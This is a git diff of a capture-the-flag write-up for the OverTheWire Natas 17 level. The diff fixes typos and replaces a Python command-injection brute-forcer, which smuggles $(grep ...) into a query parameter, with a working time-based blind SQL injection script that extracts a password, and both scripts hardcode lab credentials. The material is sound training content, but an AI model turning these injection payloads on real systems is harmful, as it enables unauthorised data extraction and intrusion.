@@ -10,34 +10,42 @@
 
  
 ### Solution
-* Click view sourcecode there you can see that there isn't any output we got back from the server, so we need to think out something else to determine the response of the select statment
+* Click view sourcecode there you can see that there isn't any output we got back from the server, so we need to think out something else to determine the response of the select statement
 * We can use 'SLEEP(n)' to determine from the response time whether entered character exists in the password or not, using this query (Time-based attacks):
 ```
  SELECT * from users where username="natas18" AND password LIKE BINARY '{char}%' AND SLEEP(5) --
 ```
-* Notice that the condition after 'AND' execute only if the previous condition return TRUE, so if the password condition return true the response should be delayed by 5sec
-* We can implements this aproach in two ways:
+* Notice that the condition after 'AND' execute only if the previous condition returns TRUE, so if the password condition return true the response should be delayed by 5sec
+* We can implement this approach in two ways:
 ##### Python Script
 * To perform brute-force to retrieve the password using Time-based attack use this python script:
 ```py
-import requests
-import string
+  import requests, string
 
-chars = string.ascii_uppercase + string.ascii_lowercase + '0123456789'
-base_url = 'http://natas16.natas.labs.overthewire.org/?needle='
-password = ''
+  chars = string.ascii_uppercase + string.ascii_lowercase + '0123456789'
+  base_url = 'http://natas17.natas.labs.overthewire.org/index.php?username='
+  password = ''
 
-for i in range(32):
-    cnt = 0
-    while True:
-        payload = password + chars[cnt]
-        r = requests.get(base_url+f'Africans$(grep ^{payload} /etc/natas_webpass/natas17)', auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
-        cnt += 1
+  newChars = []
+  for char in chars:
+      r = requests.get(base_url+f'natas18%22+AND+password+LIKE+BINARY+%22%25{char}%25%22+AND+SLEEP%285%29+%23', auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
+      if r.elapsed.total_seconds() >= 5:
+          newChars.append(char)
 
-        if not 'Africans' in r.text:
-            password = payload
-            print(password)
-            break
+  chars = ''.join(newChars)
+  print('Characters used in password: ' + chars)            
+
+  for i in range(32):
+      cnt = 0
+      while True:
+          payload = password + chars[cnt]
+          r = requests.get(base_url+f'natas18%22+AND+password+LIKE+BINARY+%22{payload}%25%22+AND+SLEEP%285%29+%23', auth=('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'))
+          cnt += 1
+
+          if r.elapsed.total_seconds() >= 5:
+              password = payload
+              print(password, end = '\r')
+              break
 ```
 
 ##### Sqlmap
